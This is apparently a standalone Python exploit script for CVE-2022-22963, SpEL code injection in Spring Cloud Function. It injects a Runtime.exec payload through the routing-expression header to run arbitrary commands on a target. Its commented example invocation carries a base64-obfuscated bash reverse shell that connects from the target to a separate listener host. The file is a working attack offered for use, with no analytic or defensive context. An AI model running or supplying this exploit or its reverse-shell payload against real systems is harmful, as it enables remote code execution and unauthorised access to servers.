#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Time       : 2023/4/13 11:02
# Author     : yunkong
# FileName   : cve_2022_22963_cmd.py
# Description:
#
# Exploit Title: Spring Cloud Function SpEL Code Injection (CVE-2022-22963)
# Version: 3.0.0.RELEASE <= Spring Cloud Function <= 3.2.2
# CVE: CVE-2022-22963

import requests
import urllib3

urllib3.disable_warnings()


def exploit(target_url, command):
    payload = f'T(java.lang.Runtime).getRuntime().exec("{command}")'

    data = 'test'
    headers = {
        'spring.cloud.function.routing-expression': payload,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    path = '/functionRouter'

    target_url = target_url.strip()
    all = target_url + path
    try:
        req = requests.post(url=all, headers=headers, data=data, verify=False, timeout=3)
        code = req.status_code
        text = req.text
        rsp = '"error":"Internal Server Error"'

        if code == 500 and rsp in text:
            print("[+] Command executed successfully")
        else:
            print("[-] Failed to execute command")

    except requests.exceptions.RequestException:
        print(f'[-] {target_url} detection timed out')
    except:
        print(f'[-] {target_url} error')


def vuln_exploit_start(target_url, command):
    exploit(target_url, command)


# vuln_exploit_start("http://192.168.12.130:8080/",
#                    "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEyLjE1Mi81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}")
